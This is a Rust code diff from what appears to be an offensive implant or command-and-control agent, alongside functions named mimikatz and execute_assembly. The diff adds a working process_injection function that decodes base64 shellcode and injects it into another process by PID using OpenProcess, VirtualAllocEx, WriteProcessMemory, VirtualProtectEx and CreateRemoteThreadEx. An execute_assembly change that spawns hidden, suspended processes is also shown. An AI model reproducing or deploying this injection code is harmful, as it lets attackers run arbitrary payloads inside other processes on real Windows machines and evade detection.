@@ -19,6 +19,70 @@ pub fn mimikatz(args: Vec<&str>) -> String {
     return "todo".to_string()
 }
 
+pub fn process_injection(args: Vec<&str>) -> String {
+    if args.len() < 2 {
+        return "please specify PID".to_string()
+    }
+    let pid = match args[1].parse::<u32>() {
+        Err(e)  => return e.to_string(),
+        Ok(pid) => pid,
+    };
+    let mut output_vec: Vec<String> = Vec::new();
+    let shellcode_b64 = args[2];
+    let mut shellcode = base64::decode(shellcode_b64).unwrap();
+    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 
+    // get process handle
+    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
+        winapi::um::winnt::PROCESS_ALL_ACCESS,
+        0x01,
+        pid
+    )};
+    output_vec.push(format!("OpenProcess: {:?}", handle));
+    // alloc payload
+    let addr_shellcode = unsafe {winapi::um::memoryapi::VirtualAllocEx(
+        handle,
+        std::ptr::null_mut(),
+        shellcode.len(),
+        winapi::um::winnt::MEM_COMMIT,
+        winapi::um::winnt::PAGE_READWRITE
+    )};
+    output_vec.push(format!("VirtualAllocEx: {:?}", addr_shellcode));
+    let mut ret_len: usize = 0;
+    let mem_write = unsafe {winapi::um::memoryapi::WriteProcessMemory(
+        handle,
+        addr_shellcode,
+        shellcode_ptr,
+        shellcode.len(),
+        &mut ret_len
+    )};
+    let last_error = unsafe {winapi::um::errhandlingapi::GetLastError()};
+    output_vec.push(format!("WriteProcessMemory: {:?}", mem_write));
+    output_vec.push(format!("GetLastError: {:?}", last_error));
+    // protect and execute
+    let mut old_protect: u32 = 0;
+    let virt_protect = unsafe {winapi::um::memoryapi::VirtualProtectEx(
+        handle,
+        addr_shellcode,
+        shellcode.len(),
+        winapi::um::winnt::PAGE_EXECUTE_READ,
+        &mut old_protect
+    )};
+    output_vec.push(format!("VirtualProtectEx: {:?}", virt_protect));
+    let remote_thread = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
+        handle,
+        std::ptr::null_mut(),
+        0,
+        std::mem::transmute(addr_shellcode),
+        0 as _,
+        0,
+        std::ptr::null_mut(),
+        0 as _
+    )};
+    output_vec.push(format!("CreateRemoteThreadEx: {:?}", remote_thread));
+    output_vec.push("shellcode injected".to_string());
+    output_vec.join("\n")
+}
+
 pub fn execute_assembly(args: Vec<&str>) -> String {
     if args.len() < 8 {
         return "".to_string()
@@ -41,7 +105,7 @@ pub fn execute_assembly(args: Vec<&str>) -> String {
     
     // spawn suspended process
     let cmd = std::process::Command::new(process)
-        .stdin(std::process::Stdio::piped())
+        //.stdin(std::process::Stdio::piped())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
         .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW | winapi::um::winbase::CREATE_SUSPENDED)
